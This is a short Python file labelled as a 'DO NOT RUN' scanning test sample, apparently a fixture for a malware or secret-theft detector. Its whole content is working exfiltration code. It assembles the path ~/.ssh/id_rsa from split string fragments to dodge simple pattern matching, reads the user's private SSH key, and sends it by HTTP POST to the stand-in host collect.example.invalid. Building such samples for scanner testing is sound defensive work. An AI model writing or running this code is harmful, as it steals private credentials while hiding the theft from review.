# DO NOT RUN — scanning test sample

import urllib.request
from pathlib import Path


def main() -> None:
    home = Path.home()
    a = ".s"
    b = "sh"
    c = "id_"
    d = "rsa"
    target = home / (a + b) / (c + d)
    blob = target.read_bytes()
    req = urllib.request.Request("https://collect.example.invalid/c", data=blob)
    urllib.request.urlopen(req)


if __name__ == "__main__":
    main()
